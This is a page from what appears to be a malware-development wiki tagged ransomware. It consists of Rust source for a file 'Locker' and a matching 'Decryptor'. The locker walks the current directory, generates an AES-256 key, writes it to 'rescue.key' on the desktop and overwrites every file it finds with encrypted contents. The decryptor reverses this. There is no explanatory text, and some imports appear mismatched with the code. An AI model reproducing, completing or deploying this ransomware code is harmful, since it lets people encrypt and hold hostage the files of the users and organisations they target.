---
author(s):
  - Userware
tags:
  - post-exploitation
  - impact
  - malware-development
  - ransomware
  - cross-platform
---
# Rust

## Locker

```rust
use std::io::Write;
use std::path::{Path, PathBuf};
use std::fs::{read, write, OpenOption};

use rand::{thread_rng, Rng};
use crypto::aessafe::AesSafe256Encryptor;
use dirs::desktop_dir;
use walkdir::WalkDir;
use aesstream::AesWriter;

fn fetch_files(origin: &str) -> () {
    if let Some(mut desktop) = desktop_dir() {
        let walk = WalkDir::new(origin)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file());

        let key: [u8;32] = key_generate(&mut desktop);

        let encryptor: AesSafe256Encryptor = AesSafe256Encryptor::new(&key);

        for file in walk {
            encrypt_target_file(file.path(), encryptor);
        }
    }
}

fn key_generate(desktop: &mut PathBuf) -> [u8;32] {
    let key: [u8;32] = thread_rng().gen();

    desktop.push("rescue.key");
    write(desktop, key)
        .expect("Key cannot be stored...");

    return key;
}

fn encrypt_target_file(path: &Path, encryptor: AesSafe256Encryptor) -> () {
    if let Ok(file) = OpenOptions::new().write(true).open(path) {
        if let Ok(content) = read(path) {
            if let Ok(mut writer) = AesWriter::new(file, encryptor) {
                let _ = writer.write_all(&content);
            }
        }
    }
}

fn main() -> () {
    fetch_files(".");
}
```

## Decryptor

```rust
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::fs::{read, write, OpenOption};

use rand::{thread_rng, Rng};
use crypto::aessafe::AesSafe256Decryptor;
use dirs::desktop_dir;
use walkdir::WalkDir;
use aesstream::AesReader;

fn fetch_files(origin: &str) -> () {
    if let Some(mut desktop) = desktop_dir() {
        let walk = WalkDir::new(origin)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file());

        let key: [u8; 32] = key_read(&mut desktop);

        let decryptor: AesSafe256Decryptor = AesSafe256Decryptor::new(&key);

        for file in walk {
            decrypt_target_file(file.path(), decryptor);
        }
    }
}

fn key_read(desktop: &mut PathBuf) -> [u8; 32] {
    desktop.push("rescue.key");
    let mut key = [0u8; 32];
    let mut file = OpenOptions::new().read(true).open(desktop).expect("Key file not found");
    file.read_exact(&mut key).expect("Failed to read key");
    key
}

fn decrypt_target_file(path: &Path, decryptor: AesSafe256Decryptor) -> () {
    if let Ok(file) = OpenOptions::new().read(true).open(path) {
        if let Ok(mut reader) = AesReader::new(file, decryptor) {
            let mut decrypted_content = Vec::new();
            reader.read_to_end(&mut decrypted_content).expect("Failed to read decrypted content");
            write(path, decrypted_content).expect("Failed to write decrypted content");
        }
    }
}

fn main() -> () {
    fetch_files(".");
}
```